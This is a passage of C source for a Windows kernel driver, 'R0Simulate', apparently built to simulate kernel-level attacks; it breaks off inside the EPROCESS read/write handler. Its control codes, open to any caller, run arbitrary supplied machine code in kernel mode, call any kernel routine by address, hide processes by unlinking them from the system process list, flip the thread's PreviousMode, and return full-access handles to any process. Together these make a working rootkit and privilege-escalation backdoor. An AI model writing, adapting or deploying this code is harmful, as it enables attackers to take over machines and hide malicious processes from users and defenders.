#include <ntifs.h>

#pragma warning(disable:4100 4189)

NTKERNELAPI NTSTATUS ZwProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    SIZE_T *RegionSize,
    ULONG NewProtect,
    ULONG *OldProtect
);

#define DEVICE_NAME     L"\\Device\\R0Simulate"
#define SYM_LINK_NAME   L"\\DosDevices\\R0Simulate"

#define IOCTL_R0SIMULATE_EXEC_INSTRUCTION           CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_CALL_KERNEL_API            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_PROCESS_HIDING             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_PREVIOUS_MODE_SWITCH       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_OPEN_HANDLE                CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_R0SIMULATE_KERNEL_READWRITE_EPROCESS  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define R0SIMULATE_FLAG_USE_ADDRESS  0x00000001

#define R0SPMS_MODE_KERNEL   0x00
#define R0SPMS_MODE_USER     0x01

#define R0SKRE_OP_READ   0
#define R0SKRE_OP_WRITE  1
#define R0SKRE_SIZE_1    0
#define R0SKRE_SIZE_2    1
#define R0SKRE_SIZE_4    2
#define R0SKRE_SIZE_8    3

#define R0SKPH_OP_ADD      0x10
#define R0SKPH_OP_REMOVE   0x11
#define R0SKPH_OP_LIST     0x12

typedef struct _EXEC_INSTRUCTION_INPUT {
    ULONG   InstructionSize;
    UCHAR   Instruction[1];
} EXEC_INSTRUCTION_INPUT, *PEXEC_INSTRUCTION_INPUT;

typedef struct _EXEC_INSTRUCTION_OUTPUT {
    UINT64  ReturnValue;
    NTSTATUS Status;
} EXEC_INSTRUCTION_OUTPUT, *PEXEC_INSTRUCTION_OUTPUT;

typedef struct _CALL_KERNEL_API_INPUT {
    ULONG   ApiNameLength;
    ULONG   ArgumentCount;
    ULONG   Flags;
    UINT64  Arguments[16];
    WCHAR   ApiName[1];
} CALL_KERNEL_API_INPUT, *PCALL_KERNEL_API_INPUT;

typedef struct _CALL_KERNEL_API_OUTPUT {
    UINT64  ReturnValue;
    NTSTATUS Status;
} CALL_KERNEL_API_OUTPUT, *PCALL_KERNEL_API_OUTPUT;

typedef struct _PREVIOUS_MODE_SWITCH_INPUT {
    UCHAR   Mode;
    UCHAR   ViewOnly;
    UCHAR   Reserved[6];
} PREVIOUS_MODE_SWITCH_INPUT, *PPREVIOUS_MODE_SWITCH_INPUT;

typedef struct _PREVIOUS_MODE_SWITCH_OUTPUT {
    NTSTATUS Status;
    UCHAR    OldMode;
    UCHAR    NewMode;
} PREVIOUS_MODE_SWITCH_OUTPUT, *PPREVIOUS_MODE_SWITCH_OUTPUT;

typedef struct _KERNEL_RW_EPROCESS_INPUT {
    ULONG   Offset;
    UCHAR   Operation;
    UCHAR   Reserved[3];
    UINT64  Value;
} KERNEL_RW_EPROCESS_INPUT, *PKERNEL_RW_EPROCESS_INPUT;

typedef struct _KERNEL_RW_EPROCESS_OUTPUT {
    NTSTATUS Status;
    UINT64   ReturnValue;
} KERNEL_RW_EPROCESS_OUTPUT, *PKERNEL_RW_EPROCESS_OUTPUT;

typedef struct _PROCESS_HIDING_INPUT {
    UINT64  Address;
    ULONG   Length;
    UCHAR   Operation;
    UCHAR   Reserved[3];
} PROCESS_HIDING_INPUT, *PPROCESS_HIDING_INPUT;

typedef struct _HIDDEN_PROCESS_ENTRY {
    LIST_ENTRY ListEntry;
    HANDLE     ProcessId;
    PEPROCESS  EProcess;
} HIDDEN_PROCESS_ENTRY, *PHIDDEN_PROCESS_ENTRY;

PDEVICE_OBJECT g_DeviceObject = NULL;
UNICODE_STRING g_SymLinkName;

static LIST_ENTRY g_HiddenListHead;
static KSPIN_LOCK g_HiddenListLock;

static ULONG g_PreviousModeOffset = 0;
static ULONG g_ActiveProcessLinksOffset = 0;

NTSTATUS DriverEntry(PDRIVER_OBJECT, PUNICODE_STRING);
VOID DriverUnload(PDRIVER_OBJECT);
NTSTATUS DriverCreateClose(PDEVICE_OBJECT, PIRP);
NTSTATUS DriverDeviceControl(PDEVICE_OBJECT, PIRP);

NTSTATUS ExecuteInstruction(PEPROCESS, PVOID, ULONG, PUINT64);
static NTSTATUS CallKernelApiInternal(PVOID, ULONG, UINT64*, PVOID, ULONG, PUINT64);
static NTSTATUS HandlePreviousModeSwitch(PVOID, ULONG, PVOID, ULONG, PULONG_PTR);
static NTSTATUS HandleProcessHiding(PVOID, ULONG, PVOID, ULONG, PULONG_PTR);

NTSTATUS InitDynamicOffsets(VOID) {
    NTSTATUS status = STATUS_SUCCESS;
    UNICODE_STRING us;
    PVOID pExGetPrevMode, pPsGetPid;
    UCHAR *pCode;
    USHORT offset;

    RtlInitUnicodeString(&us, L"ExGetPreviousMode");
    pExGetPrevMode = MmGetSystemRoutineAddress(&us);
    if (!pExGetPrevMode) {
        DbgPrint("[R0S] ERROR: Failed to get ExGetPreviousMode address.\n");
        return STATUS_NOT_FOUND;
    }

    pCode = (UCHAR*)pExGetPrevMode;
    __try {
        offset = *(USHORT*)(pCode + 0x0C);
        g_PreviousModeOffset = offset;
        DbgPrint("[R0S] PreviousMode offset = 0x%X\n", offset);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[R0S] EXCEPTION reading ExGetPreviousMode, code: 0x%X\n", GetExceptionCode());
        return GetExceptionCode();
    }

    RtlInitUnicodeString(&us, L"PsGetProcessId");
    pPsGetPid = MmGetSystemRoutineAddress(&us);
    if (!pPsGetPid) {
        DbgPrint("[R0S] ERROR: Failed to get PsGetProcessId address.\n");
        return STATUS_NOT_FOUND;
    }

    pCode = (UCHAR*)pPsGetPid;
    __try {
        offset = *(USHORT*)(pCode + 0x03);
        g_ActiveProcessLinksOffset = offset + 0x08;
        DbgPrint("[R0S] UniqueProcessId offset = 0x%X, ActiveProcessLinks = 0x%X\n",
                 offset, g_ActiveProcessLinksOffset);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[R0S] EXCEPTION reading PsGetProcessId, code: 0x%X\n", GetExceptionCode());
        return GetExceptionCode();
    }

    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    NTSTATUS status;
    PDEVICE_OBJECT deviceObject;
    UNICODE_STRING devName;

    status = InitDynamicOffsets();
    if (!NT_SUCCESS(status)) {
        DbgPrint("[R0S] Dynamic offset init failed, driver load rejected.\n");
        return status;
    }

    RtlInitUnicodeString(&devName, DEVICE_NAME);
    RtlInitUnicodeString(&g_SymLinkName, SYM_LINK_NAME);

    status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN,
                            0, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    g_DeviceObject = deviceObject;
    deviceObject->Flags |= DO_BUFFERED_IO;

    status = IoCreateSymbolicLink(&g_SymLinkName, &devName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(deviceObject);
        return status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]  = DriverCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDeviceControl;
    DriverObject->DriverUnload = DriverUnload;

    InitializeListHead(&g_HiddenListHead);
    KeInitializeSpinLock(&g_HiddenListLock);

    deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
    return STATUS_SUCCESS;
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    PHIDDEN_PROCESS_ENTRY pEntry, pNext;
    KIRQL oldIrql;

    KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
    for (PLIST_ENTRY pList = g_HiddenListHead.Flink; pList != &g_HiddenListHead; pList = (PLIST_ENTRY)pNext) {
        pEntry = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
        pNext = (PHIDDEN_PROCESS_ENTRY)pList->Flink;

        RemoveEntryList(&pEntry->ListEntry);
        KeReleaseSpinLock(&g_HiddenListLock, oldIrql);

        PEPROCESS pProc = pEntry->EProcess;
        if (pProc) {
            PLIST_ENTRY pLink = (PLIST_ENTRY)((PCHAR)pProc + g_ActiveProcessLinksOffset);
            PEPROCESS pSys = PsInitialSystemProcess;
            PLIST_ENTRY pSysLink = (PLIST_ENTRY)((PCHAR)pSys + g_ActiveProcessLinksOffset);
            InsertHeadList(pSysLink, pLink);
            ObDereferenceObject(pProc);
        }
        ExFreePoolWithTag(pEntry, 'HIDE');

        KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
    }
    KeReleaseSpinLock(&g_HiddenListLock, oldIrql);

    if (g_DeviceObject) {
        IoDeleteSymbolicLink(&g_SymLinkName);
        IoDeleteDevice(g_DeviceObject);
    }
}

NTSTATUS DriverCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS ExecuteInstruction(PEPROCESS TargetProcess, PVOID InstructionCode,
                            ULONG InstructionSize, PUINT64 ReturnValue) {
    NTSTATUS status = STATUS_SUCCESS;
    PVOID execMem = NULL;
    UINT64 result = 0;

    execMem = ExAllocatePoolWithTag(NonPagedPoolExecute, InstructionSize, '0SR0');
    if (!execMem) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlCopyMemory(execMem, InstructionCode, InstructionSize);

    __try {
        KAPC_STATE apcState;
        KeStackAttachProcess((PRKPROCESS)TargetProcess, &apcState);
        __try {
            result = ((UINT64(*)())execMem)();
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            status = GetExceptionCode();
        }
        KeUnstackDetachProcess(&apcState);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }

    if (ReturnValue) *ReturnValue = result;
    ExFreePoolWithTag(execMem, '0SR0');
    return status;
}

static NTSTATUS CallKernelApiInternal(
    PVOID ApiAddress,
    ULONG Argc,
    UINT64 *Args,
    PVOID OutputBuffer,
    ULONG OutputSize,
    UINT64 *ReturnValue)
{
    NTSTATUS status = STATUS_SUCCESS;
    UINT64 ret = 0;
    PVOID stackMem = NULL;
    SIZE_T stackSize = 0;

    UNREFERENCED_PARAMETER(OutputBuffer);
    UNREFERENCED_PARAMETER(OutputSize);

    if (Argc > 16) return STATUS_NOT_SUPPORTED;

    if (Argc > 4) {
        stackSize = (Argc - 4) * sizeof(UINT64);
        stackMem = ExAllocatePoolWithTag(NonPagedPool, stackSize, '0SR0');
        if (!stackMem) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        RtlCopyMemory(stackMem, &Args[4], stackSize);
    }

    __try {
        switch (Argc) {
            case 0: ret = ((UINT64(*)())ApiAddress)(); break;
            case 1: ret = ((UINT64(*)(UINT64))ApiAddress)(Args[0]); break;
            case 2: ret = ((UINT64(*)(UINT64, UINT64))ApiAddress)(Args[0], Args[1]); break;
            case 3: ret = ((UINT64(*)(UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2]); break;
            case 4: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3]); break;
            case 5: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0]); break;
            case 6: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1]); break;
            case 7: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2]); break;
            case 8: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3]); break;
            case 9: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4]); break;
            case 10: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5]); break;
            case 11: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6]); break;
            case 12: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7]); break;
            case 13: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7], ((UINT64*)stackMem)[8]); break;
            case 14: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7], ((UINT64*)stackMem)[8], ((UINT64*)stackMem)[9]); break;
            case 15: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7], ((UINT64*)stackMem)[8], ((UINT64*)stackMem)[9], ((UINT64*)stackMem)[10]); break;
            case 16: ret = ((UINT64(*)(UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64, UINT64))ApiAddress)(Args[0], Args[1], Args[2], Args[3], ((UINT64*)stackMem)[0], ((UINT64*)stackMem)[1], ((UINT64*)stackMem)[2], ((UINT64*)stackMem)[3], ((UINT64*)stackMem)[4], ((UINT64*)stackMem)[5], ((UINT64*)stackMem)[6], ((UINT64*)stackMem)[7], ((UINT64*)stackMem)[8], ((UINT64*)stackMem)[9], ((UINT64*)stackMem)[10], ((UINT64*)stackMem)[11]); break;
            default: status = STATUS_NOT_SUPPORTED;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }

    if (ReturnValue) *ReturnValue = ret;

    if (stackMem) ExFreePoolWithTag(stackMem, '0SR0');
    return status;
}

static NTSTATUS HandlePreviousModeSwitch(PVOID InputBuffer, ULONG InputSize,
                                         PVOID OutputBuffer, ULONG OutputSize,
                                         PULONG_PTR Info) {
    __try {
        if (InputSize < sizeof(PREVIOUS_MODE_SWITCH_INPUT) || !InputBuffer) {
            return STATUS_INVALID_PARAMETER;
        }
        PPREVIOUS_MODE_SWITCH_INPUT pInput = (PPREVIOUS_MODE_SWITCH_INPUT)InputBuffer;
        if (OutputSize < sizeof(PREVIOUS_MODE_SWITCH_OUTPUT)) {
            return STATUS_BUFFER_TOO_SMALL;
        }

        PETHREAD pEThread = PsGetCurrentThread();
        if (!pEThread) {
            return STATUS_UNSUCCESSFUL;
        }

        PUCHAR pPrevMode = (PUCHAR)pEThread + g_PreviousModeOffset;
        UCHAR oldMode = *pPrevMode;
        UCHAR newMode = oldMode;

        if (pInput->ViewOnly == 0) {
            if (pInput->Mode != R0SPMS_MODE_KERNEL && pInput->Mode != R0SPMS_MODE_USER) {
                return STATUS_INVALID_PARAMETER;
            }
            newMode = pInput->Mode;
            *pPrevMode = newMode;
        }

        PPREVIOUS_MODE_SWITCH_OUTPUT pOutput = (PPREVIOUS_MODE_SWITCH_OUTPUT)OutputBuffer;
        pOutput->Status = STATUS_SUCCESS;
        pOutput->OldMode = oldMode;
        pOutput->NewMode = newMode;

        *Info = sizeof(PREVIOUS_MODE_SWITCH_OUTPUT);
        return STATUS_SUCCESS;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
}

static NTSTATUS HandleProcessHiding(PVOID InputBuffer, ULONG InputSize,
                                    PVOID OutputBuffer, ULONG OutputSize,
                                    PULONG_PTR Info) {
    NTSTATUS status = STATUS_SUCCESS;
    __try {
        if (!InputBuffer || InputSize < sizeof(PROCESS_HIDING_INPUT))
            return STATUS_INVALID_PARAMETER;

        PPROCESS_HIDING_INPUT pIn = (PPROCESS_HIDING_INPUT)InputBuffer;
        UCHAR op = pIn->Operation;

        if (op != R0SKPH_OP_ADD && op != R0SKPH_OP_REMOVE && op != R0SKPH_OP_LIST)
            return STATUS_INVALID_PARAMETER;

        if (op == R0SKPH_OP_ADD) {
            if (InputSize < sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG))
                return STATUS_BUFFER_TOO_SMALL;
            ULONG pid = *(PULONG)((PUCHAR)InputBuffer + sizeof(PROCESS_HIDING_INPUT));
            if (pid == 0) return STATUS_INVALID_PARAMETER;

            PEPROCESS pTarget = NULL;
            status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &pTarget);
            if (!NT_SUCCESS(status)) return status;

            PHIDDEN_PROCESS_ENTRY pEntry = (PHIDDEN_PROCESS_ENTRY)ExAllocatePoolWithTag(NonPagedPool, sizeof(HIDDEN_PROCESS_ENTRY), 'HIDE');
            if (!pEntry) {
                ObDereferenceObject(pTarget);
                return STATUS_INSUFFICIENT_RESOURCES;
            }
            RtlZeroMemory(pEntry, sizeof(HIDDEN_PROCESS_ENTRY));
            pEntry->ProcessId = (HANDLE)(ULONG_PTR)pid;
            pEntry->EProcess = pTarget;

            PLIST_ENTRY pLink = (PLIST_ENTRY)((PCHAR)pTarget + g_ActiveProcessLinksOffset);
            RemoveEntryList(pLink);

            KIRQL oldIrql;
            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
            InsertHeadList(&g_HiddenListHead, &pEntry->ListEntry);
            KeReleaseSpinLock(&g_HiddenListLock, oldIrql);

            if (OutputSize >= sizeof(NTSTATUS)) {
                *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS;
                *Info = sizeof(NTSTATUS);
            } else {
                *Info = 0;
            }
            return STATUS_SUCCESS;
        }

        if (op == R0SKPH_OP_REMOVE) {
            if (InputSize < sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG))
                return STATUS_BUFFER_TOO_SMALL;
            ULONG pid = *(PULONG)((PUCHAR)InputBuffer + sizeof(PROCESS_HIDING_INPUT));
            if (pid == 0) return STATUS_INVALID_PARAMETER;

            KIRQL oldIrql;
            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);

            PHIDDEN_PROCESS_ENTRY pEntry = NULL;
            PLIST_ENTRY pList = g_HiddenListHead.Flink;
            while (pList != &g_HiddenListHead) {
                PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
                if ((ULONG)(ULONG_PTR)pCur->ProcessId == pid) {
                    pEntry = pCur;
                    RemoveEntryList(&pEntry->ListEntry);
                    break;
                }
                pList = pList->Flink;
            }
            KeReleaseSpinLock(&g_HiddenListLock, oldIrql);

            if (!pEntry) {
                if (OutputSize >= sizeof(NTSTATUS)) {
                    *(NTSTATUS*)OutputBuffer = STATUS_NOT_FOUND;
                    *Info = sizeof(NTSTATUS);
                } else {
                    *Info = 0;
                }
                return STATUS_NOT_FOUND;
            }

            PEPROCESS pProc = pEntry->EProcess;
            if (pProc) {
                PLIST_ENTRY pLink = (PLIST_ENTRY)((PCHAR)pProc + g_ActiveProcessLinksOffset);
                PEPROCESS pSys = PsInitialSystemProcess;
                PLIST_ENTRY pSysLink = (PLIST_ENTRY)((PCHAR)pSys + g_ActiveProcessLinksOffset);
                InsertHeadList(pSysLink, pLink);
                ObDereferenceObject(pProc);
            }
            ExFreePoolWithTag(pEntry, 'HIDE');

            if (OutputSize >= sizeof(NTSTATUS)) {
                *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS;
                *Info = sizeof(NTSTATUS);
            } else {
                *Info = 0;
            }
            return STATUS_SUCCESS;
        }

        if (op == R0SKPH_OP_LIST) {
            ULONG maxCount = 0;
            if (OutputSize >= sizeof(ULONG))
                maxCount = (OutputSize - sizeof(ULONG)) / sizeof(HANDLE);

            KIRQL oldIrql;
            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);

            ULONG count = 0;
            PLIST_ENTRY pList = g_HiddenListHead.Flink;
            while (pList != &g_HiddenListHead && count < maxCount) {
                PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
                ((HANDLE*)((PUCHAR)OutputBuffer + sizeof(ULONG)))[count] = pCur->ProcessId;
                count++;
                pList = pList->Flink;
            }
            KeReleaseSpinLock(&g_HiddenListLock, oldIrql);

            if (OutputSize >= sizeof(ULONG)) {
                *(ULONG*)OutputBuffer = count;
                *Info = sizeof(ULONG) + count * sizeof(HANDLE);
            } else {
                *Info = 0;
                return STATUS_BUFFER_TOO_SMALL;
            }
            return STATUS_SUCCESS;
        }

        return STATUS_INVALID_PARAMETER;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
}

NTSTATUS DriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG_PTR info = 0;
    ULONG code = irpSp->Parameters.DeviceIoControl.IoControlCode;
    PVOID inputBuffer = Irp->AssociatedIrp.SystemBuffer;
    ULONG inputSize = irpSp->Parameters.DeviceIoControl.InputBufferLength;
    PVOID outputBuffer = Irp->AssociatedIrp.SystemBuffer;
    ULONG outputSize = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

    switch (code) {
        case IOCTL_R0SIMULATE_EXEC_INSTRUCTION: {
            __try {
                if (inputSize < sizeof(EXEC_INSTRUCTION_INPUT) || !inputBuffer) {
                    status = STATUS_INVALID_PARAMETER;
                    break;
                }
                PEXEC_INSTRUCTION_INPUT execInput = (PEXEC_INSTRUCTION_INPUT)inputBuffer;
                if (execInput->InstructionSize == 0) {
                    status = STATUS_INVALID_PARAMETER;
                    break;
                }
                if (inputSize < sizeof(EXEC_INSTRUCTION_INPUT) + execInput->InstructionSize - 1) {
                    status = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                if (outputSize < sizeof(EXEC_INSTRUCTION_OUTPUT)) {
                    status = STATUS_BUFFER_TOO_SMALL;
                    break;
                }
                UINT64 returnValue = 0;
                status = ExecuteInstruction(PsGetCurrentProcess(), execInput->Instruction,
                                            execInput->InstructionSize, &returnValue);
                PEXEC_INSTRUCTION_OUTPUT output = (PEXEC_INSTRUCTION_OUTPUT)outputBuffer;
                output->ReturnValue = returnValue;
                output->Status = status;
                info = sizeof(EXEC_INSTRUCTION_OUTPUT);
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                status = GetExceptionCode();
            }
            break;
        }

        case IOCTL_R0SIMULATE_CALL_KERNEL_API: {
            __try {
                if (inputSize < sizeof(CALL_KERNEL_API_INPUT) || !inputBuffer) {
                    status = STATUS_INVALID_PARAMETER;
                    break;
                }
                PCALL_KERNEL_API_INPUT apiInput = (PCALL_KERNEL_API_INPUT)inputBuffer;

                if (!(apiInput->Flags & R0SIMULATE_FLAG_USE_ADDRESS)) {
                    if (apiInput->ApiNameLength == 0 || apiInput->ApiNameLength > 512 ||
                        inputSize < sizeof(CALL_KERNEL_API_INPUT) + apiInput->ApiNameLength) {
                        status = STATUS_INVALID_PARAMETER;
                        break;
                    }
                    if (apiInput->ApiNameLength % 2 != 0) {
                        status = STATUS_INVALID_PARAMETER;
                        break;
                    }
                }
                if (apiInput->ArgumentCount > 16) {
                    status = STATUS_INVALID_PARAMETER;
                    break;
                }
                if (outputSize < sizeof(CALL_KERNEL_API_OUTPUT)) {
                    status = STATUS_BUFFER_TOO_SMALL;
                    break;
                }

                PVOID apiAddress = NULL;
                if (apiInput->Flags & R0SIMULATE_FLAG_USE_ADDRESS) {
                    UINT64 addr = 0;
                    RtlCopyMemory(&addr, apiInput->ApiName, sizeof(addr));
                    apiAddress = (PVOID)(ULONG_PTR)addr;
                } else {
                    UNICODE_STRING apiName;
                    RtlInitUnicodeString(&apiName, apiInput->ApiName);
                    apiAddress = MmGetSystemRoutineAddress(&apiName);
                    if (!apiAddress) {
                        status = STATUS_NOT_FOUND;
                        break;
                    }
                }

                UINT64 returnValue = 0;
                status = CallKernelApiInternal(apiAddress,
                                               apiInput->ArgumentCount, apiInput->Arguments,
                                               outputBuffer, outputSize, &returnValue);

                PCALL_KERNEL_API_OUTPUT output = (PCALL_KERNEL_API_OUTPUT)outputBuffer;
                output->ReturnValue = returnValue;
                output->Status = status;
                info = sizeof(CALL_KERNEL_API_OUTPUT);
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                status = GetExceptionCode();
            }
            break;
        }

        case IOCTL_R0SIMULATE_PROCESS_HIDING: {
            status = HandleProcessHiding(inputBuffer, inputSize, outputBuffer, outputSize, &info);
            break;
        }

        case IOCTL_R0SIMULATE_PREVIOUS_MODE_SWITCH: {
            status = HandlePreviousModeSwitch(inputBuffer, inputSize, outputBuffer, outputSize, &info);
            break;
        }

        case IOCTL_R0SIMULATE_OPEN_HANDLE: {
            __try {
                if (inputSize < sizeof(ULONG) || outputSize < sizeof(HANDLE)) {
                    status = STATUS_INVALID_PARAMETER;
                    break;
                }
                ULONG pid = *(PULONG)inputBuffer;
                HANDLE hKernelProcess = NULL;
                OBJECT_ATTRIBUTES oa;
                CLIENT_ID cid;

                InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
                cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
                cid.UniqueThread = NULL;

                status = ZwOpenProcess(&hKernelProcess, PROCESS_ALL_ACCESS, &oa, &cid);
                if (NT_SUCCESS(status)) {
                    HANDLE hUserProcess = NULL;
                    status = ZwDuplicateObject(
                        ZwCurrentProcess(),
                        hKernelProcess,
                        ZwCurrentProcess(),
                        &hUserProcess,
                        PROCESS_ALL_ACCESS,
                        0,
                        0
                    );
                    if (NT_SUCCESS(status)) {
                        *(HANDLE*)outputBuffer = hUserProcess;
                        info = sizeof(HANDLE);
                    }
                    ZwClose(hKernelProcess);
                }
                if (!NT_SUCCESS(status)) {
                    *(HANDLE*)outputBuffer = NULL;
                    info = sizeof(HANDLE);
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                status = GetExceptionCode();
            }
            break;
        }

        case IOCTL_R0SIMULATE_KERNEL_READWRITE_EPROCESS: {
            __try {
                if (inputSize < sizeof(KERNEL_RW_EPROCESS_INPUT) ||
                    outputSize < sizeof(KERNEL_RW_EPROCESS_OUTPUT)) {
                    status = STATUS_INVALID_PARAMETER;
                    break;
                }

                PKERNEL_RW_EPROCESS_INPUT pIn = (PKERNEL_RW_EPROCESS_INPUT)inputBuffer;
